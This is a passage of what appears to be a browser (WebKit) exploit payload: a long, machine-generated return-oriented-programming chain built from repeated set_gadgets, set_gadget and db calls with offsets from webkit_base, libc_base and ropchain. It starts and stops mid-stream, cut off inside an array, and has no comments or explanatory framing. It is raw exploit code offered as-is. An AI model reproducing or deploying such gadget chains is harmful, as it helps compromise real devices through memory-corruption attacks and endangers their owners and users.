db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+253328, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+253344, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+253536, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+253488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+253504, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+253520, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+785347, 
libc_base+793877, 
ropchain+253720, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+253768, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+253736, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+253704, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+253752, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+253928, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+253896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+253880, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([56, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+254032, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+254016, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+254112, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+254216, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+254232, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+254336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+254320, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+254392, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([3, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+254504, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+254608, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+254624, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+254776, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+254808, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+254792, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+254760, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+254880, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+254896, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+255016, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+255032, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+255000, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+255128, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+255144, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+255256, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+255240, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+255344, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+255328, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+255440, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+255456, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+255568, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+255552, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+255640, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+255704, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([272, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([25, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+255968, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+256072, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+256088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+256240, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+256272, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+256256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+256224, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+256368, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+256352, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+256472, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+294224, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+793877, 
ropchain+256584, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+256656, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+256728, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+256800, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+256872, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+256944, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257016, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257088, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257160, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257232, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257304, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257376, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257448, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257520, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257592, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257664, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257736, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257808, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257880, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257952, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258024, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258096, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258168, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258240, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258312, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258384, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258456, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258528, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258600, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258672, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258744, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258816, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258888, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258960, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259032, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259104, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259176, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259248, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259320, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259392, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259464, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259536, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259608, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259680, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259752, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259824, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259896, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259968, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260040, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260112, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260184, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260256, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260328, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260400, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260472, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260544, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260616, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260688, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260760, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260832, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260904, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260976, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261048, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261120, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261192, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261264, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261336, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261408, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261480, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261552, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261624, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261696, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261768, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261840, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261912, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261984, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262056, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262128, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262200, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262272, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262344, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262416, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262488, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262560, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262632, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262704, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262776, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262848, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262920, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262992, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263064, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263136, 
